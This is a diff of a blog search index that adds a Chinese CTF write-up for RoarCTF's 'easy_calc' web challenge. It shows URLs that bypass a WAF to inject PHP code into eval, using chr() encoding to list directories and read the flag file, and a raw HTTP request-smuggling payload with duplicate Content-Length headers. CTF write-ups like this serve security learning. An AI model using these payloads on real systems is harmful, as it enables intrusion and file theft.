@@ -1,6 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Roarctf Web writeup</title>
+    <url>/2019/10/28/Roarctf-Web-writeup/</url>
+    <content><![CDATA[<p>#写在前面，很多知识都不会，但在慢慢学习过程中积累，下面记录一下Roarctf web 题解，学习一手新知识</p><p>1.easy_calc</p><p>看了一下页面可以计算式子，猜测后台是eval函数，看了下网络看经过哪些请求，发现请求了一个请求网址calc.php?num=1，于是访问calc.php，看到了源码</p><a id="more"></a>
+
+
+<p><img src="1572272252121.png" alt="1572272252121"></p>
+<p>是一个正则匹配，匹配到测试字符则退出，否则eval执行，当时我发现了这个，看了一下，输了phpinfo();发现是403，而之前页面源码告诉了有waf，然后不会做，这里附个链接<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">传送门</a> 发现可以利用PHP的字符串解析特性Bypass，所以传参加一个空格即可绕过</p>
+<p><img src="1572273442458.png" alt="1572273442458"></p>
+<p>看了disable_functions发现该禁的基本上都禁了，之后其实挺简单的，读文件就行，注意之前的正则，这里用ascii编码绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//node3.buuoj.cn:28890/calc.php? num=var_dump(scandir(chr(47)));	//查文件</span></span><br><span class="line">http:<span class="comment">//node3.buuoj.cn:28890/calc.php?num=readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));	//读文件</span></span><br></pre></td></tr></table></figure>
+
+<p>看别人的writeup还有一种写法是http走私附个链接<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">传送门</a> 大概就是用CL发送一个请求让服务器两次处理</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /calc.php?num=phpinfo(); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node3.buuoj.cn:<span class="number">28890</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cookie: __cfduid=df52311039f2f717d63d154645ddf93431564799805</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br><span class="line"><span class="comment">Content-Length: 9</span></span><br><span class="line"><span class="comment">Content-Length: 9	//两个C-L，用http走私</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">num=phpinfo();</span></span><br></pre></td></tr></table></figure>
+
+<p>2.easy_java</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Syc Geek 10th web部分题解</title>
     <url>/2019/10/26/Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
     <content><![CDATA[<p>1.打比赛先撸一只猫</p><p>查看源码，发现简单考点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><a id="more"></a>
